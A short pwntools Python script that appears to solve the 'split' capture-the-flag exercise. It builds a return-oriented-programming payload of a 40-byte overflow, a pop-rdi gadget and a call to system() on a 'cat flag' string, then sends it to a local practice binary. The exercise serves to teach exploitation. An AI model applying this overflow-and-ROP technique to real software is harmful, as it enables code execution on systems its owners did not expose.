#!/usr/bin/python3

from pwn import *

e = ELF('./split')
p = process('./split')

offset = 40
# address
system = e.symbols['system']

# gadgets
pop_rdi = 0x4007c3
ret = 0x40053e

# consts
cat_flag = 0x601060

# payload
payload = b'A' * offset
payload += p64(ret)

payload += p64(pop_rdi)
payload += p64(cat_flag)
payload += p64(system)

p.send(payload)
p.interactive()
